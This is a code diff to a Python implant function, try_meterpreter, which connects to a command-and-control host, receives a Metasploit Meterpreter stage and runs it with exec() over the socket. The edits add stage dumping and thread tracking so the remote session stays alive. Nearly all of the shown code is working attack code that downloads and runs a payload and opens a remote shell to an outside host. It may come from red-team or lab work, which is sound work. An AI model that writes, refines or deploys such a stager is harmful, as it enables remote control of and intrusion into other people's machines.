@@ -396,21 +396,35 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
                 time.sleep(retry_delay)
                 continue
 
-            log.info("Meterpreter stage prepared — executing")
             _c2_method = "meterpreter"
             _meterpreter_socket = s
+
+            # Dump the decompressed stage to disk for diagnostics —
+            # we need to see what the code actually does
+            _stage_dump = Path("/clients/landnav_stage_dump.py")
+            try:
+                _stage_bytes = (prepared if isinstance(prepared, bytes)
+                                else prepared.encode("utf-8"))
+                _stage_dump.write_bytes(_stage_bytes)
+                log.info("Stage dumped to %s (%d bytes)",
+                         _stage_dump, len(_stage_bytes))
+            except Exception as _e:
+                log.warning("Could not dump stage: %s", _e)
 
             # Clear the staging timeout — the meterpreter dispatch
             # loop needs blocking I/O (or sets its own timeouts)
             s.settimeout(None)
 
-            # Snapshot threads before exec — the stage may spawn
-            # dispatch threads and return immediately
+            # Snapshot threads before exec
             _pre = set(t.ident for t in threading.enumerate())
 
+            log.info("Meterpreter stage executing (threads before: %d)",
+                     len(_pre))
             _t0 = time.monotonic()
             try:
-                exec(compile(prepared, "<meterpreter>", "exec"), {"s": s})
+                # exec source directly — match the standard MSF stager
+                # pattern exactly (no pre-compile step)
+                exec(prepared, {"s": s})
             except SystemExit as e:
                 log.warning("Meterpreter stage called sys.exit(%s)", e.code)
             except BaseException as e:
@@ -419,12 +433,14 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
                 import traceback
                 log.error("Stage traceback:\n%s", traceback.format_exc())
 
-            # The MSF Python meterpreter stage starts its packet
-            # dispatch loop in a background thread and returns.
-            # If we close the socket now, we kill the live session.
-            # Detect those threads and wait for them.
+            # Check for dispatch threads spawned by the stage
+            _post = set(t.ident for t in threading.enumerate())
+            _new = _post - _pre
             _met_threads = [t for t in threading.enumerate()
-                            if t.ident not in _pre and t.is_alive()]
+                            if t.ident in _new and t.is_alive()]
+
+            log.info("exec() returned: threads after=%d new=%d alive=%d",
+                     len(_post), len(_new), len(_met_threads))
 
             if _met_threads:
                 log.info("Meterpreter spawned %d dispatch thread(s) — "
